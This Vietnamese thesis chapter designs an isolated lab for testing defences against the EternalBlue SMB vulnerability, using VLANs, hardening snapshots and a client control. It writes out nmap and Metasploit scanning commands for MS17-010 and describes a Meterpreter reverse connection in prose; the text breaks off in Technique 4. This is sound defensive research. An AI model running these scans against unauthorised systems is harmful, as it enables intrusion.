# CHƯƠNG 2. THIẾT KẾ VÀ TRIỂN KHAI MÔ HÌNH THỰC NGHIỆM

Chương 2 thiết kế môi trường kiểm thử SMB dựa trên cơ sở lý thuyết ở Chương 1. Mô hình gồm các phân vùng mạng, chuỗi cấu hình phòng thủ và điểm thu thập dữ liệu để xác định điều kiện của đường tấn công đang xét. Client hợp lệ được bố trí riêng nhằm kiểm tra ảnh hưởng của biện pháp phòng thủ lên hoạt động chia sẻ tệp.

---

## 2.1. YÊU CẦU VÀ NGUYÊN TẮC THIẾT KẾ MÔ HÌNH THỰC NGHIỆM

### 2.1.1. Nguyên tắc đạo đức nghề nghiệp và phạm vi kiểm thử được ủy quyền

Kiểm thử an ninh mạng (Penetration Testing) là hoạt động đánh giá an toàn thông tin can thiệp trực tiếp vào bề mặt dịch vụ và cơ chế quản lý bộ nhớ của hệ thống. Do đó, việc thiết kế và vận hành mô hình thực nghiệm phải tuân thủ nghiêm ngặt các chuẩn mực đạo đức nghề nghiệp và ranh giới pháp lý xác định [1]:

1. **Giới hạn phạm vi ủy quyền (Scope of Authorization):**
   Mọi thao tác khảo sát, quét cổng, gửi yêu cầu thăm dò và xác minh an ninh chỉ được phép thực hiện trên các hệ thống máy ảo thuộc môi trường lab cô lập do nhóm nghiên cứu trực tiếp thiết lập, quản lý và sở hữu. Nghiêm cấm hoàn toàn việc hướng công cụ kiểm thử hoặc phát tán các gói tin thăm dò tới bất kỳ địa chỉ IP, dải mạng hoặc thiết bị nào nằm ngoài phạm vi phòng lab nội bộ của đề tài.

2. **Nguyên tắc không phá hoại và kiểm soát tác động:**
   Quá trình kiểm thử được thiết kế nhằm mục đích nhận diện và đánh giá rủi ro, không nhằm mục đích phá hoại tính sẵn sàng của hệ thống. Trong các pha kiểm thử có khả năng gây mất ổn định vùng nhớ nhân hệ điều hành, người kiểm thử phải áp dụng các tham số kiểm soát chặt chẽ, sử dụng payload an toàn và luôn có phương án phục hồi hệ thống tức thời [1].

3. **Bảo mật dữ liệu thực nghiệm:**
   Cấu hình kỹ thuật, mã định danh hệ thống và dữ liệu phát sinh trong quá trình thực nghiệm phải được lưu trữ trong môi trường nội bộ an toàn, phục vụ mục đích nghiên cứu của đồ án. Việc chia sẻ phải tuân theo phạm vi đã xác định.

### 2.1.2. Yêu cầu về tính cô lập và kiểm soát rủi ro mạng

Lab được thiết kế cô lập để kiểm soát lưu lượng và tác động của phép kiểm thử. Chính sách mạng giới hạn các kết nối theo mục đích sử dụng và các phân vùng đã xác định [2]:
- **Ngăn chặn rò rỉ lưu lượng (Traffic Containment):** Mạng lab phải được ngắt kết nối hoàn toàn khỏi mạng cục bộ của cơ sở đào tạo và Internet công cộng. Các gói tin SMB (TCP 445 / 139) và dữ liệu khai thác không được phép định tuyến vượt ra ngoài thiết bị chuyển mạch ảo nội bộ.
- **Loại bỏ kết nối Internet thực:** Toàn bộ kết nối ngoại vi (nếu có) chỉ là mạng diện rộng mô phỏng (Simulated WAN) phục vụ kiểm thử định tuyến, không có kết nối vật lý hoặc logic ra Internet thật.
- **Kiểm soát gateway và DHCP:** Các máy trạm trong các phân vùng mạng chỉ trỏ Default Gateway về thiết bị tường lửa nội bộ (Firewall/UTM). Không sử dụng dịch vụ DHCP cấp phát tự động dùng chung với máy chủ vật lý nhằm tránh xung đột và kiểm soát chặt chẽ nguồn gốc lưu lượng mạng.

### 2.1.3. Mô hình chuỗi điều kiện của đường tấn công (Causal-Chain Model)

Đề tài tổ chức phép kiểm tra theo các điều kiện của đường tấn công CVE-2017-0144 để phân biệt nguyên nhân không thiết lập được phiên thử nghiệm. Các điều kiện gồm khả năng tiếp cận mạng ($R$), phản hồi dịch vụ ($S$), chấp nhận SMBv1 ($D$), trạng thái lỗ hổng ($V$), thực thi mã thử nghiệm thành công ($E$) và thiết lập kết nối ngược ($C$). Mô hình này phục vụ cấu hình lab được chọn, không phải định lý cho mọi cuộc tấn công SMB.

Trong phạm vi mô hình, thực thi mã thành công đòi hỏi các điều kiện cần:

$$E \implies R \land S \land D \land V$$

Với kịch bản dùng kết nối ngược, kết quả phiên thử nghiệm còn phụ thuộc vào $C$. Các điều kiện $R, S, D, V$ cùng thỏa mãn chưa bảo đảm $E$ hoặc $C$ thành công, vì kết quả còn phụ thuộc vào cấu hình công cụ và trạng thái hệ thống. Do $E$ là kết quả cần kiểm chứng, không sử dụng nó như một tiền điều kiện độc lập để suy ra chính kết quả đó.

$R$ được kiểm tra bằng lưu lượng và chính sách mạng; $S$ cần phản hồi dịch vụ, không chỉ một gói `SYN-ACK`; $D$ cần kết quả thương lượng SMBv1. Đánh giá $V$ phải đối chiếu phản hồi thăm dò với build, bản vá và cấu hình mục tiêu. $E$ và $C$ chỉ được xác nhận khi có bằng chứng thực thi mã và kết nối ngược tương ứng. Các phép quan sát cụ thể được thiết kế ở Mục 2.4 [3], [4].

Mỗi điều kiện được ghi là `True`, `False` hoặc `Unknown` theo bằng chứng. `Unknown` nghĩa là chưa đủ dữ liệu hoặc phép kiểm tra không hoàn tất; không được đổi thành `False` chỉ vì bước trước bị chặn. Khi xác nhận một điều kiện cần không thỏa mãn, đề tài có thể kết luận đường tấn công đang xét bị chặn trong cấu hình và góc quan sát đó, không kết luận hệ thống an toàn trước mọi đường tấn công.

---

## 2.2. THIẾT KẾ KIẾN TRÚC MẠNG LAB DOANH NGHIỆP MÔ PHỎNG

### 2.2.1. Cấu trúc mạng phân đoạn 3 VLAN

Đề tài lựa chọn mô hình ba phân vùng mạng để tách Server, trạm kiểm thử và Client hợp lệ. Kiến trúc bao gồm một tường lửa ảo làm điểm định tuyến, kết nối qua switch ảo và tách thành ba VLAN. Đây là cấu hình do đề tài đề xuất; nguyên tắc kiểm soát lưu lượng tham khảo hướng dẫn chính sách tường lửa [2]:

1. **VLAN 10 – Server Subnet (`192.168.10.0/24`):**
   Phân vùng máy chủ nội bộ. Chứa máy chủ mục tiêu Windows 7 SP1 x64 đóng vai trò máy chủ chia sẻ tệp SMB (`192.168.10.20`).
2. **VLAN 20 – Pentest Subnet (`192.168.20.0/24`):**
   Phân vùng dành riêng cho trạm kiểm thử an ninh. Chứa máy kiểm thử Kali Linux (`192.168.20.10`), mô phỏng vị trí của một máy trạm bị thỏa hiệp hoặc phân vùng kiểm thử chuyên trách.
3. **VLAN 30 – User Subnet (`192.168.30.0/24`):**
   Phân vùng người dùng văn phòng hợp lệ. Chứa máy trạm Windows Client (`192.168.30.50`), đóng vai trò là trạm đối chứng nghiệp vụ dương tính (Positive Business Control).

### 2.2.2. Nguyên lý Inter-VLAN Routing và Firewall Inspection

Cơ chế định tuyến và kiểm soát lưu lượng được thiết kế theo các nguyên tắc mạng doanh nghiệp nghiêm ngặt [2]:
- **Firewall là điểm định tuyến duy nhất (Single Routing Point):** Thiết bị Tường lửa/UTM (sử dụng pfSense, OPNsense hoặc VyOS) đóng vai trò là Default Gateway của cả ba VLAN (`192.168.10.1`, `192.168.20.1`, `192.168.30.1`). Mọi lưu lượng truyền thông giữa các VLAN (Inter-VLAN traffic) bắt buộc phải đi qua tường lửa để kiểm tra chính sách (Stateful Inspection) và ghi nhận nhật ký (Firewall Logging).
- **Chính sách kiểm soát phiên hai chiều (Stateful Inspection & Reverse Channel Policy):**
  - *Chiều Inbound (VLAN 20 $\to$ VLAN 10):* Tại các trạng thái $S_0, S_1, S_2$, Firewall cho phép lưu lượng TCP tới cổng 139 và 445 của máy chủ mục tiêu. Tại trạng thái $S_3$, quy tắc này chuyển sang chế độ từ chối và ghi nhật ký (`Block & Log`), bẻ gãy tiền điều kiện $R$ ngay tại cửa ngõ vào.
  - *Chiều Outbound / Egress (VLAN 10 $\to$ VLAN 20):* Do payload khai thác Meterpreter sử dụng kiến trúc kết nối ngược (`reverse_tcp`), máy mục tiêu sau khi bị chèn shellcode sẽ chủ động khởi tạo phiên TCP ra ngoài hướng về trạm kiểm thử (`192.168.20.10:4444`). Tại $S_0, S_1, S_2$, Firewall được cấu hình chính sách cho phép lưu lượng thử nghiệm có kiểm soát từ VLAN 10 sang cổng 4444 của VLAN 20 nhằm đo lường khả năng thiết lập kênh liên lạc ngược ($C$). Khi bước sang trạng thái $S_3$, do gói tin tấn công ban đầu bị chặn ngay tại chiều vào ($R = \text{False}$), mã độc không được kích hoạt trên máy chủ, dẫn đến kênh kết nối ngược $C$ tự động bị vô hiệu hóa từ gốc rễ.
- **Core Switch thuần Layer 2:** Thiết bị chuyển mạch Core Switch chỉ thực hiện chức năng chuyển mạch và truyền tải các đường trung kế (802.1Q Trunking), hoàn toàn không bật tính năng định tuyến IP (Layer 3 Switching bị tắt). Điều này ngăn chặn việc các gói tin đi tắt qua switch mà bỏ qua tường lửa.
- **Không kết nối Internet thật:** Phía ngoài tường lửa được kết nối tới một mạng diện rộng mô phỏng (Simulated WAN: `172.16.0.0/24`) phục vụ kiểm thử các kịch bản định tuyến biên, hoàn toàn cách ly với card mạng vật lý của máy chủ chủ quản.

### 2.2.3. Sơ đồ Topo mạng kiến trúc doanh nghiệp mô phỏng

Sơ đồ 2.1 mô tả chi tiết kiến trúc kết nối và phân bổ phân vùng mạng trong môi trường thực nghiệm:

```
+-------------------------------------------------------------------------+
|                  MẠNG DOANH NGHIỆP MÔ PHỎNG (ENTERPRISE LAB)            |
|                                                                         |
|  [SIMULATED WAN: 172.16.0.0/24] (Cô lập hoàn toàn, không Internet thật) |
|                                 |                                       |
|                                 v (WAN Interface: 172.16.0.2)           |
|  +-------------------------------------------------------------------+  |
|  |                 FIREWALL / UTM APPLIANCE (pfSense / VyOS)         |  |
|  |   - Điểm duy nhất thực hiện Inter-VLAN Routing                    |  |
|  |   - Default Gateway: .10.1 (VLAN 10), .20.1 (VLAN 20), .30.1 (VLAN30)|
|  |   - Điểm thực thi chính sách lọc gói & Stateful Inspection        |  |
|  +-----------------------------------+-------------------------------+  |
|                                      |                                  |
|                                      | Trunk 802.1Q (VLAN 10, 20, 30)   |
|                                      v                                  |
|  +-------------------------------------------------------------------+  |
|  |               CORE SWITCH LAYER 2 (802.1Q Switching Only)         |  |
|  |               (Không định tuyến L3, chỉ trunking và access)       |  |
|  +-------------------+---------------+-------------------------------+  |
|                      |               |               |                  |
|        Access VLAN 10|  Access VLAN 20|  Access VLAN 30|                 |
|                      v               v               v                  |
|             +----------------+ +---------------+ +------------------+   |
|             | SERVER SUBNET  | |PENTEST SUBNET | | USER SUBNET      |   |
|             | VLAN 10        | | VLAN 20       | | VLAN 30          |   |
|             | 192.168.10.0/24| |192.168.20.0/24| | 192.168.30.0/24  |   |
|             +----------------+ +---------------+ +------------------+   |
|                      |                 |                 |              |
|                      v                 v                 v              |
|             +----------------+ +---------------+ +------------------+   |
|             | Target-Win7    | | Attacker-Kali | | Client-WinUser   |   |
|             | 192.168.10.20  | | 192.168.20.10 | | 192.168.30.50    |   |
|             | Target 4-State | | Trạm kiểm thử | | Trạm đối chứng   |   |
|             | (S0->S1->S2->S3| | Nmap/NSE/MSF  | | nghiệp vụ hợp lệ |   |
|             +----------------+ +---------------+ +------------------+   |
|                                                                         |
+-------------------------------------------------------------------------+
```
*Sơ đồ 2.1: Sơ đồ topo mạng phân đoạn doanh nghiệp mô phỏng (Enterprise Network Topology)*

### 2.2.4. Phân bổ không gian địa chỉ IP và thông số kỹ thuật

Ma trận thông số mạng, phân bổ địa chỉ IP và cấu hình giao diện mạng được chuẩn hóa tại Bảng 2.1:

*Bảng 2.1: Ma trận phân bổ địa chỉ IP, VLAN và thông số kỹ thuật các nút mạng*

| Tên nút mạng | Phân vùng mạng | VLAN ID | Địa chỉ IP / Subnet | Default Gateway | Dịch vụ lắng nghe chính | Vai trò nghiên cứu |
|---|---|:---:|---|---|---|---|
| **Firewall/UTM** | Định tuyến biên | 10, 20, 30 | `192.168.10.1`, `20.1`, `30.1` | Không có (Root GW) | Lọc gói, ghi nhật ký, Inter-VLAN routing | Điểm kiểm soát chính sách và bẻ gãy tiền điều kiện $R$ |
| **Attacker-Kali** | Pentest Subnet | 20 | `192.168.20.10/24` | `192.168.20.1` | Không mở dịch vụ inbound | Trạm phát sinh lưu lượng kiểm thử (Nmap, Metasploit) |
| **Target-Win7** | Server Subnet | 10 | `192.168.10.20/24` | `192.168.10.1` | TCP 445 (`microsoft-ds`), TCP 139 (`netbios-ssn`) | Đối tượng kiểm thử đơn biến qua 4 trạng thái snapshot |
| **Client-WinUser**| User Subnet | 30 | `192.168.30.50/24` | `192.168.30.1` | Client SMB Workstation | Đối chứng nghiệp vụ dương tính (Positive Business Control) |

---

## 2.3. MÔ HÌNH MÁY TRẠNG THÁI ĐƠN BIẾN (SINGLE-VARIABLE CAUSAL STATE MACHINE)

### 2.3.1. Thiết kế chuỗi 4 trạng thái Snapshot trên cùng một hệ thống mục tiêu

Đề tài giữ một máy ảo Windows 7 SP1 x64 làm mục tiêu và thiết kế chuỗi trạng thái $S_0 \to S_1 \to S_2 \to S_3$. Mỗi bước bổ sung một cấu hình phòng thủ: cài bản vá, tắt SMBv1 rồi chặn truy cập từ VLAN kiểm thử. Snapshot giúp lưu cấu hình để khôi phục trước lượt kiểm tra, nhưng không tự bảo đảm trạng thái bộ nhớ và mọi hoạt động nền đều giống nhau.

Đây là chuỗi tăng cường phòng thủ tích lũy, không phải thiết kế đầy đủ mọi tổ hợp biến. Vì $S_2$ giữ bản vá của $S_1$ và $S_3$ giữ cả hai biện pháp trước, việc không tạo được phiên thử nghiệm tại các trạng thái sau chưa xác định riêng hiệu quả của biện pháp mới. Đề tài cần kiểm tra trực tiếp điều kiện mà mỗi biện pháp hướng tới, đồng thời giới hạn kết luận về tương tác giữa các biện pháp. Thiết kế hiện tại không đủ để suy ra hiệu quả độc lập của mọi cấu hình phòng thủ.

Bốn trạng thái snapshot được định nghĩa cụ thể:

1. **Trạng thái $S_0$ – Vulnerable Baseline (Trạng thái gốc tồn tại lỗ hổng):**
   - *Cấu hình:* Windows 7 SP1 x64 nguyên bản (Build 7601), chưa cài đặt gói KB4012212; tính năng SMBv1 được kích hoạt mặc định; Firewall nội bộ cho phép lưu lượng TCP 445/139 từ VLAN 20 và VLAN 30; dịch vụ `LanmanServer` hoạt động bình thường [5], [6].
   - *Giả thuyết cần kiểm tra:* Cấu hình được chọn để khảo sát $R, S, D, V$; các giá trị chỉ được xác nhận sau khi đối chiếu dữ liệu. $E$ và $C$ chưa xác định.
   - *Ý nghĩa:* Xác lập điểm chuẩn ban đầu (baseline), kiểm chứng khả năng phát hiện ở cả 4 cấp độ.

2. **Trạng thái $S_1$ – Patch Only (Chỉ áp dụng bản vá an ninh):**
   - *Biến thay đổi duy nhất:* Cài đặt bản cập nhật an ninh chính thức `Windows6.1-KB4012212-x64.msu` [5]. Giữ nguyên tính năng SMBv1 đang bật và giữ nguyên chính sách mạng cho phép truy cập cổng 445.
   - *Giả thuyết cần kiểm tra:* $R, S, D$ được duy trì; bản vá hướng tới loại bỏ điều kiện $V$ trong đường tấn công đang xét. $E$ và $C$ chưa được xác nhận.
   - *Ý nghĩa:* Thiết kế phép kiểm tra việc cập nhật bản vá khắc phục khiếm khuyết trong driver `srv.sys` (bẻ gãy $V$), trong khi khả năng tiếp cận mạng ($R$), dịch vụ ($S$) và đàm phán SMBv1 ($D$) vẫn tồn tại nguyên vẹn.

3. **Trạng thái $S_2$ – SMBv1 Disabled (Vô hiệu hóa giao thức SMBv1):**
   - *Biến thay đổi duy nhất:* Giữ nguyên bản vá của $S_1$, thực thi vô hiệu hóa máy chủ SMBv1 thông qua cấu hình Registry theo tài liệu Microsoft Learn [6]:
     ```cmd
     reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v SMB1 /t REG_DWORD /d 0 /f
     ```
   - *Giả thuyết cần kiểm tra:* $R, S$ được duy trì; cấu hình hướng tới $D = \text{False}$ và giữ bản vá của $S_1$. $E$ và $C$ chưa được xác nhận.
   - *Ý nghĩa:* Thiết kế phép kiểm tra việc tắt SMBv1 loại bỏ khả năng đàm phán phương ngữ cũ ($D = \text{False}$), trong khi cổng TCP 445 vẫn mở và dịch vụ chia sẻ tệp qua SMBv2 vẫn duy trì hoạt động ($R = \text{True}, S = \text{True}$).

4. **Trạng thái $S_3$ – Firewall / Segmentation Hardened (Gia cố phân đoạn mạng bằng Tường lửa):**
   - *Biến thay đổi duy nhất:* Giữ nguyên trạng thái $S_2$, thiết lập chính sách lọc gói trên Firewall/UTM chặn toàn bộ lưu lượng TCP 445 và 139 khởi tạo từ VLAN 20 (Pentest) đi sang VLAN 10 (Server). Chính sách vẫn cho phép TCP 445 từ VLAN 30 (User) đi sang VLAN 10.
   - *Giả thuyết cần kiểm tra:* Quy tắc chặn hướng tới $R = \text{False}$ từ VLAN 20. Các điều kiện bên trong Server không xác định được chỉ từ góc này; cần kiểm tra riêng. $E$ và $C$ chưa được xác nhận.
   - *Ý nghĩa:* Thiết kế phép kiểm tra phân đoạn mạng ngăn chặn khả năng tiếp cận của kẻ tấn công ($R = \text{False}$) từ các phân vùng mạng không tin cậy.

### 2.3.2. Vai trò đối chứng nghiệp vụ dương tính của trạm Client tại VLAN 30

Một lỗ hổng lớn trong các mô hình kiểm thử an toàn là chỉ tập trung vào việc ngăn chặn tấn công mà bỏ qua tính sẵn sàng của nghiệp vụ (Business Availability). Một biện pháp phòng thủ làm sập hoặc làm gián đoạn việc chia sẻ tệp của người dùng hợp lệ không thể được coi là giải pháp an toàn thành công.

Để giải quyết vấn đề này, máy trạm `Client-WinUser` tại VLAN 30 (`192.168.30.50`) đóng vai trò là **trạm đối chứng nghiệp vụ dương tính (Positive Business Control)**. Tại mỗi trạng thái snapshot từ $S_0$ đến $S_3$, sau khi trạm Kali Linux hoàn tất các kịch bản kiểm thử, trạm Client được dùng để thực hiện các thao tác kiểm tra truy cập:
1. Thực hiện lệnh gắn kết tài nguyên chia sẻ qua giao thức SMB:
   ```cmd
   net use Z: \\192.168.10.20\ShareData /user:labuser Password123!
   ```
2. Thực hiện đọc, ghi một tệp tin dữ liệu thử nghiệm và xác nhận phiên truyền thông sử dụng phương ngữ SMBv2 thông qua lệnh PowerShell:
   ```powershell
   Get-SmbConnection | Select-Object ServerName, Dialect, NumOpens
   ```

*Bảng 2.2: Giả thuyết cấu hình và yêu cầu kiểm chứng qua bốn trạng thái snapshot*

| Trạng thái | Cấu hình dự kiến | Điều kiện cần kiểm tra | Phần chưa được suy ra | Đối chứng từ Client tại VLAN 30 |
|---|---|---|---|---|
| $S_0$ | Chưa vá, SMBv1 bật, cho phép kết nối | Xác nhận $R, S, D$; đối chiếu build/bản vá để đánh giá $V$ | $E, C$ chưa xác định khi chưa chạy và thu bằng chứng | Kiểm tra thương lượng, đọc và ghi tệp |
| $S_1$ | Bổ sung bản vá KB4012212 | Xác nhận bản vá và thay đổi dấu hiệu thăm dò | Không suy ra mọi điều kiện chỉ từ một nhãn quét | Kiểm tra hoạt động SMBv2 |
| $S_2$ | Giữ bản vá và tắt SMBv1 | Xác nhận Server không chấp nhận SMBv1 | Không quy thất bại của phiên thử nghiệm riêng cho việc tắt SMBv1 | Kiểm tra hoạt động SMBv2 |
| $S_3$ | Giữ $S_2$, chặn VLAN 20 truy cập SMB tại VLAN 10 | Đối chiếu lưu lượng và log để đánh giá $R$ từ VLAN 20 | Không gán $S, D, V$ là False khi không quan sát được từ xa | Kiểm tra truy cập hợp lệ từ VLAN 30 |

Bảng này mô tả thiết kế và giả thuyết kiểm tra, chưa chứa kết quả đã đo. Dữ liệu thực nghiệm được ghi riêng trong Bảng 2.4 với nhãn `[CẦN DỮ LIỆU]`. Khi truy cập từ VLAN 20 bị chặn, dịch vụ trên Server vẫn phải được kiểm tra từ góc quan sát khác; không suy ra dịch vụ đã dừng. Đọc và ghi tệp thành công giúp đánh giá tính sẵn sàng theo tác vụ; để đánh giá tính toàn vẹn cần đối chiếu nội dung tệp trước và sau.

### 2.3.3. Kiểm chứng vị trí chặn đường tấn công và khả năng phục vụ Client

Không tạo được phiên thử nghiệm có thể do biện pháp phòng thủ, lỗi kết nối, cấu hình công cụ hoặc sự cố trên máy mục tiêu. Vì vậy, đề tài không dùng riêng kết quả này để kết luận hệ thống đã được bảo vệ. Mỗi trạng thái cần bằng chứng về điều kiện mà cấu hình phòng thủ hướng tới và bằng chứng về tác động lên dịch vụ.

Tại $S_1$, cần đối chiếu bản vá được cài đặt với hệ điều hành mục tiêu và phản hồi của phép thăm dò. Nmap NSE và Metasploit scanner có thể hỗ trợ đối chiếu, nhưng không được coi là hai bằng chứng hoàn toàn độc lập nếu cùng dựa vào một dấu hiệu SMB. Không dùng các kết quả này để khẳng định đã quan sát trực tiếp mọi thay đổi trong bộ nhớ nhân [5], [4].

Tại $S_2$, cần kiểm tra việc Server không chấp nhận SMBv1 sau cấu hình, đồng thời kiểm tra SMBv2 từ Client hợp lệ [6]. Do trạng thái này giữ bản vá trước đó, kết quả không thiết lập được phiên thử nghiệm chỉ có ý nghĩa trong cấu hình phòng thủ kết hợp; phép kiểm tra thương lượng mới giúp xác định riêng thay đổi ở điều kiện $D$.

Tại $S_3$, đối chiếu lưu lượng tại trạm kiểm thử, log tường lửa và lưu lượng tại Server để xác định quy tắc chặn có tác dụng trên đường kết nối đang xét. Cổng bị báo `filtered` chưa đủ để xác định nguyên nhân nếu thiếu các bằng chứng này [3]. Khi không thể tiếp cận Server từ VLAN 20, các điều kiện tiếp theo chưa quan sát được ở góc này; không được đồng nhất với việc dịch vụ hoặc lỗ hổng bên trong Server đã biến mất.

Client tại VLAN 30 được dùng để kiểm tra tác động lên truy cập hợp lệ. Tiêu chí gồm thương lượng SMBv2, đọc và ghi tệp thử nghiệm, đối chiếu nội dung khi cần đánh giá tính toàn vẹn. Chưa có log hoặc dữ liệu chạy thật để kết luận các tác vụ đã thành công ở mọi trạng thái. Phần này giữ vai trò thiết kế đối chứng; kết quả thực nghiệm còn `[CẦN DỮ LIỆU]`.

---

## 2.4. PHƯƠNG PHÁP LUẬN VÀ CHUẨN HÓA KỸ THUẬT THEO MÔ HÌNH BẠCH HỘP

Mọi kỹ thuật kiểm thử trong Chương 2 được thiết kế theo cấu trúc chuẩn mực 10 thành phần kỹ thuật, bảo đảm người nghiên cứu nắm bắt chính xác cơ chế tác động nội tại lên giao thức và hệ điều hành:

### 2.4.1. Kỹ thuật 1: Khảo sát tiếp cận và nhận diện dịch vụ (TCP SYN Scan & Service Detection)

1. **Input:** Lệnh `nmap -sS -sV -p 139,445 -n -Pn --reason 192.168.10.20`.
2. **Preconditions:** Tiền điều kiện $R = \text{True}$ (tuyến đường mạng thông suốt, không bị chặn bởi tường lửa).
3. **Internal Mechanism:** Nmap phát sinh gói tin TCP mang cờ SYN tới cổng 445 và 139. Trình điều khiển TCP/IP của máy đích phản hồi gói tin TCP mang cờ SYN-ACK. Nmap ghi nhận cổng ở trạng thái `open` và gửi ngay gói tin TCP RST để giải phóng phiên kết nối mà không hoàn tất bắt tay ba bước. Tiếp đó, Nmap gửi chuỗi đầu dò ứng dụng (Service Probes) để thu thập banner và định danh dịch vụ `microsoft-ds` [7], [3].
4. **Observation Point:** Giao diện mạng `eth0` của Kali Linux và tệp tin bắt gói `pcap` tại máy mục tiêu.
5. **Success Criterion:** Cổng TCP 445 hiển thị trạng thái `open`, trường lý do ghi nhận `syn-ack`, tên dịch vụ định danh chính xác là `microsoft-ds`.
6. **Failure Criterion:** Cổng hiển thị `filtered` (gói tin bị drop, không có phản hồi hoặc nhận ICMP unreachable) hoặc `closed` (nhận gói TCP RST từ máy đích).
7. **Output / Evidence:** Dữ liệu xuất Nmap định dạng văn bản và tệp XML; bản ghi gói tin TCP bắt tay bắt đầu bằng cờ SYN và phản hồi SYN-ACK trong Wireshark.
8. **Inference Boundary:** Chỉ được phép kết luận máy mục tiêu đang lắng nghe dịch vụ chia sẻ tệp trên cổng 445 (xác nhận tiền điều kiện $R$ và $S$ đạt Cấp độ 1). Không được suy diễn hệ thống có lỗ hổng MS17-010.
9. **Limitation:** Tường lửa có tính năng giả lập SYN-ACK (SYN Proxy) có thể gây dương tính giả về trạng thái mở cổng.
10. **Defense Breakpoint:** Bị bẻ gãy khi Tường lửa thực thi quy tắc chặn lưu lượng ($R = \text{False}$ tại trạng thái $S_3$).

### 2.4.2. Kỹ thuật 2: Thăm dò khả năng đàm phán phương ngữ (Dialect Negotiation Probe)

1. **Input:** Lệnh `nmap -p 445 --script smb-protocols 192.168.10.20`.
2. **Preconditions:** $R = \text{True}$ và $S = \text{True}$ (cổng TCP 445 mở và dịch vụ phản hồi).
3. **Internal Mechanism:** Kịch bản NSE hoàn tất bắt tay ba bước TCP, sau đó gửi yêu cầu `SMB_COM_NEGOTIATE` (mã lệnh `0x72`) chứa danh sách mảng chuỗi phương ngữ từ SMB 1.0 (`NT LM 0.12`) đến SMB 3.1.1. Dịch vụ `LanmanServer` của máy đích phân tích danh sách và phản hồi phản hồi xác nhận chỉ số phương ngữ được lựa chọn [7], [4].
4. **Observation Point:** Lưu lượng phân tích giao thức SMB trong Wireshark tại trạm Kali Linux.
5. **Success Criterion:** Đầu ra kịch bản liệt kê danh sách phương ngữ được máy chủ chấp nhận có chứa `NT LM 0.12 (SMBv1)`.
6. **Failure Criterion:** Máy chủ từ chối đàm phán, chỉ chấp nhận phương ngữ từ `SMB 2.0.2` trở lên, hoặc ngắt kết nối phiên làm việc bằng cờ TCP FIN/RST.
7. **Output / Evidence:** Danh mục các phương ngữ do script hiển thị trên màn hình console; gói tin `SMB Negotiate Protocol Response` trong Wireshark với trường `Dialect Index` trỏ tới chuỗi `NT LM 0.12`.
8. **Inference Boundary:** Kết luận hệ thống hỗ trợ giao thức cũ SMBv1 (xác nhận tiền điều kiện $D = \text{True}$ đạt Cấp độ 2). Không chứng minh được hệ thống có lỗ hổng vì hệ thống đã vá vẫn có thể bật SMBv1.
9. **Limitation:** Không phát hiện được nếu dịch vụ SMB yêu cầu bắt buộc ký số (SMB Signing Required) ở mức độ ngăn chặn phiên thăm dò nặc danh ban đầu.
10. **Defense Breakpoint:** Bị bẻ gãy khi thực hiện cấu hình vô hiệu hóa máy chủ SMBv1 ($D = \text{False}$ tại trạng thái $S_2$).

### 2.4.3. Kỹ thuật 3: Dò quét phát hiện dấu hiệu lỗ hổng bằng Nmap NSE (`smb-vuln-ms17-010.nse`)

1. **Input:** Lệnh `nmap -p 445 --script smb-vuln-ms17-010 -n -Pn 192.168.10.20`.
   Kịch bản được Nmap phân loại `safe` và `vuln`. Tài liệu và mã nguồn hiện hành không cho thấy `unsafe=0` điều khiển mức độ can thiệp của kịch bản [4]. Không dùng tham số đó làm căn cứ bảo đảm an toàn; cần xác định phiên bản công cụ, phạm vi thử và điều kiện dừng trước khi chạy.
2. **Preconditions:** $R = \text{True}, S = \text{True}, D = \text{True}$ (cổng 445 mở, dịch vụ chạy, chấp nhận SMBv1).
3. **Internal Mechanism:** Kịch bản thương lượng SMBv1 và thiết lập phiên qua `Session Setup AndX`. Sau khi kết nối `IPC$` bằng `Tree Connect AndX`, kịch bản gửi yêu cầu `SMB_COM_TRANSACTION` (opcode `0x25`) chứa hàm con `PeekNamedPipe` (mã `0x2300`) với tham số `MaxDataCount` thiết lập giá trị tối đa `0xFFFF` [3], [4].
4. **Observation Point:** Phản hồi SMB trong tệp tin pcap tại trạm Kali Linux và trạm máy mục tiêu.
5. **Success Criterion (Phát hiện dấu hiệu lỗ hổng):** Driver `srv.sys` của máy mục tiêu phản hồi mã lỗi `STATUS_INSUFF_SERVER_RESOURCES` (`0xC0000205`). Kịch bản kết luận hệ thống có dấu hiệu lỗ hổng (`State: VULNERABLE`) tương ứng Cấp độ 3.
6. **Failure Criterion (Không phát hiện dấu hiệu hoặc không hoàn tất phép kiểm tra):** Máy mục tiêu phản hồi mã lỗi `STATUS_ACCESS_DENIED` (`0xC0000022`) hoặc `STATUS_INVALID_HANDLE` (`0xC0000008`), kịch bản kết luận hệ thống có khả năng cao đã được vá an toàn (`NOT VULNERABLE / Likely Patched`) [3], [4].
7. **Output / Evidence:** Lưu output, lỗi và phản hồi SMB của lượt kiểm tra. Mã nguồn hiện hành gán CVE-2017-0143 trong phần báo cáo; không dùng nhãn đó để xác nhận riêng CVE-2017-0144. Nếu phép kiểm tra không hoàn tất, ghi `Unknown` và nguyên nhân [4].
8. **Inference Boundary:** Kết quả cung cấp dấu hiệu ở Cấp độ 3 theo logic thăm dò. Không chứng minh trực tiếp mọi chi tiết xử lý trong driver, không tự xác nhận riêng CVE-2017-0144 và không bảo đảm khai thác thành công.
9. **Limitation:** Nếu máy mục tiêu cấu hình chính sách từ chối hoàn toàn phiên nặc danh (`RestrictAnonymous = 2`) và người kiểm thử không cung cấp tài khoản xác thực hợp lệ, kịch bản không thể mở kênh `IPC$` và trả về kết quả không xác định (Inconclusive).
10. **Defense Breakpoint:** Bị bẻ gãy khi hệ điều hành được cài đặt bản cập nhật KB4012212 ($V = \text{False}$ tại trạng thái $S_1$).

### 2.4.4. Kỹ thuật 4: Kiểm tra chéo bằng Metasploit Auxiliary Scanner

1. **Input:** Module `auxiliary/scanner/smb/smb_ms17_010` trong Metasploit Framework với tham số `RHOSTS 192.168.10.20`.
2. **Preconditions:** $R = \text{True}, S = \text{True}, D = \text{True}$.
3. **Internal Mechanism:** Module phát sinh gói tin thăm dò tương tự kịch bản NSE nhưng sử dụng cấu trúc phân tích đối chứng của Metasploit, nhằm kiểm tra chéo (Cross-validation) tính nhất quán của phản hồi từ driver `srv.sys` mà không kích hoạt shellcode [8], [7].
4. **Observation Point:** Nhật ký điều khiển Metasploit console và lưu lượng mạng bắt trên card `eth0`.
